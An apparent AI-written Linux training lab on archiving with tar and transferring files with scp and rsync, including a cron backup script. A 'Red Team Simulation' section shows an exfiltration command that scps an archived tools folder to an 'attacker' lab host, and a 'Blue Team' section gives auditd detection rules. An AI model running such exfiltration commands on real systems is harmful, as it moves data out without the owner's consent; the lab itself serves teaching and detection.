Excellent, Shahid.
Here is the **Cybersecurity Documentation Protocol Ultra v5.0 – Master Grade Edition** lab documentation for:

# 🧪 **Lab: Archive and Transfer Files**

*Module 13 – Archive and Transfer Files*
*Linux Essentials Level 3*
--------------------------

## 🔰 Introduction

This lab integrates the key skills from the entire module:

* **Archiving** files using `tar`
* **Compressing** using `gzip`, `bzip2`, `xz`
* **Transferring securely** using `scp`, `rsync`, `sftp`
* Simulating real-world **backup**, **tool delivery**, and **forensic transfer** workflows

> 🧠 *Goal*: Build, compress, and securely transfer archives between systems using best practices, automation, and detection-aware methods.

---

## 🧱 Lab Environment

| System | Role        | IP Address       |
| ------ | ----------- | ---------------- |
| RHEL1  | Source host | `192.168.56.101` |
| RHEL2  | Remote host | `192.168.56.102` |

🛠️ Ensure:

* SSH is enabled on both systems: `sudo systemctl start sshd`
* SSH key auth is configured or password login is allowed

---

## 🔧 Lab Tasks

### 🔹 **Task 1: Create and Compress an Archive**

1. **Prepare files**:

   ```bash
   mkdir -p ~/project_logs/{web,db}
   echo "Web Log" > ~/project_logs/web/web.log
   echo "DB Log" > ~/project_logs/db/db.log
   ```

2. **Create `.tar.gz` archive**:

   ```bash
   tar -czvf logs_project.tar.gz ~/project_logs
   ```

3. **Verify archive**:

   ```bash
   tar -tzf logs_project.tar.gz
   ```

---

### 🔹 **Task 2: Securely Transfer Archive to Remote Host**

**Using `scp`**:

```bash
scp logs_project.tar.gz user@192.168.56.102:/home/user/
```

✅ Confirm on RHEL2:

```bash
ssh user@192.168.56.102 'ls -lh ~/logs_project.tar.gz'
```

---

### 🔹 **Task 3: Extract the Archive on Remote Host**

On RHEL2:

```bash
tar -xzvf ~/logs_project.tar.gz -C ~/restored_logs
```

✅ Verify:

```bash
ls ~/restored_logs/project_logs/web
```

---

### 🔹 **Task 4: Use `rsync` for Differential Sync**

Modify a file:

```bash
echo "Web Log - Updated" >> ~/project_logs/web/web.log
```

Now sync changes:

```bash
rsync -avz ~/project_logs/ user@192.168.56.102:~/restored_logs/project_logs/
```

✅ Confirm on RHEL2:

```bash
ssh user@192.168.56.102 'cat ~/restored_logs/project_logs/web/web.log'
```

---

### 🔹 **Task 5: Automate Archive + Transfer (Bonus)**

Create a script `~/scripts/backup_and_send.sh`:

```bash
#!/bin/bash
DATE=$(date +%F)
tar -czf ~/logs_backup_$DATE.tar.gz ~/project_logs
scp ~/logs_backup_$DATE.tar.gz user@192.168.56.102:/home/user/backups/
```

Make it executable:

```bash
chmod +x ~/scripts/backup_and_send.sh
```

Schedule via cron:

```bash
crontab -e
0 2 * * * ~/scripts/backup_and_send.sh
```

---

## 🔴 Red Team Simulation: Archive and Exfiltrate Tools

On RHEL1:

```bash
tar -czf tools.tar.gz ~/tools/
scp tools.tar.gz attacker@192.168.56.200:/tmp/
```

🧩 **MITRE ATT\&CK**:

* **T1560.001**: Archive Collected Data
* **T1048.002**: Exfiltration Over SSH

---

## 🔵 Blue Team Simulation: Detection Logic

### Monitor `tar` and `scp` Usage

**Auditd Rules**:

```bash
auditctl -w /usr/bin/tar -p x -k tar-monitor
auditctl -w /usr/bin/scp -p x -k scp-monitor
```

**Syslog Sample**:

```plaintext
type=EXECVE msg=audit(...): a0="tar" a1="-czf" a2="tools.tar.gz"
type=EXECVE msg=audit(...): a0="scp" a1="tools.tar.gz" ...
```

---

## 📘 Evaluation Criteria

| Step | Task                             | Check              |
| ---- | -------------------------------- | ------------------ |
| ✅    | Created and compressed archive   | `tar -czf` used    |
| ✅    | Transferred with `scp`           | File on remote     |
| ✅    | Extracted successfully           | Files readable     |
| ✅    | Synced with `rsync`              | Deltas applied     |
| ✅    | Bonus script written & scheduled | Cron entry created |

---

## 📓 Journaling & Reflection

* 📅 *Date Completed*: `__________`
* 🔍 *Which tool was most efficient?* `scp / rsync / sftp`
* ⚠️ *Any mistakes or surprises?* `_______________________`
* 🛡 *What would you monitor as a Blue Team operator?*
  `___________________________________________________`
* 🎯 *Confidence (1–5)*: `__`

---

## 🧭 Job & Certification Mapping

| Role        | Applied Skill                | Certification |
| ----------- | ---------------------------- | ------------- |
| SOC Analyst | Detect archive transfers     | CEH, CompTIA+ |
| Linux Admin | Automate secure backups      | RHCSA         |
| Pentester   | Archive & deliver payloads   | OSCP          |
| IR Analyst  | Detect `scp` + `tar` in logs | GCFA          |

---

## 🧠 Spaced Repetition Plan

* **Day 1**: Rebuild lab from scratch (archiving, transfer, extract)
* **Day 3**: Automate script with cron + test detection
* **Day 7**: Simulate attacker exfiltration, tune detection
* **Day 30**: Document SOP + teach peer the full workflow

---

✅ **Lab Completed: Archive and Transfer Files**

Let me know the **next lesson** or lab you’d like to work on in Module 13.
